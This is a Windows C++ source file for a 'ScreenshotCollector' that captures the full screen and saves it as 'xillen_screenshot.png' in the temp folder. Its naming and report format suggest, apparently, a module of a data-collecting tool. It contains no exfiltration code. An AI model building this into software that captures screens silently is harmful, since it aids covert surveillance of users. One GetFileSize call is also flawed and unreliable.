#include "screenshot_collector.h"
#include <Windows.h>
#include <gdiplus.h>
#include <iostream>
#include <sstream>
#include <vector>

#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

std::string ScreenshotCollector::CollectScreenshot() {
    std::ostringstream result;
    
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
    hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);
    
    Bitmap* bitmap = new Bitmap(hBitmap, NULL);
    
    CLSID clsid;
    GetEncoderClsid(L"image/png", &clsid);
    
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    wcscat_s(tempPath, MAX_PATH, L"xillen_screenshot.png");
    
    bitmap->Save(tempPath, &clsid, NULL);
    
    // Получить размер файла
    DWORD fileSize = GetFileSize((HANDLE)-1, NULL);
    HANDLE hFile = CreateFileW(tempPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        fileSize = GetFileSize(hFile, NULL);
        CloseHandle(hFile);
    }
    
    char tempPathA[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, tempPath, -1, tempPathA, MAX_PATH, NULL, NULL);
    
    result << "\n=== SCREENSHOT INFO ===\n";
    result << "Screenshot saved: " << tempPathA << "\n";
    result << "Resolution: " << screenWidth << "x" << screenHeight << "\n";
    result << "File size: " << fileSize << " bytes\n";
    
    delete bitmap;
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    
    GdiplusShutdown(gdiplusToken);
    
    return result.str();
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    
    ImageCodecInfo* pImageCodecInfo = NULL;
    
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}
